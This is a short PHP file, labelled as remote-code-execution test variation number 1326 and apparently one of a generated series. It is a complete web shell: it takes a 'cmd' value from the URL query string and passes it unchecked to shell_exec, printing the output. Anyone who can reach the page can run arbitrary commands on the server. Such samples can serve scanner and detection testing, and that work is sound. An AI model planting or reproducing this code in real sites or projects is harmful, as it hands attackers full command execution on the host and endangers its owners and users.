<?php
// RCE test variation #1326
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>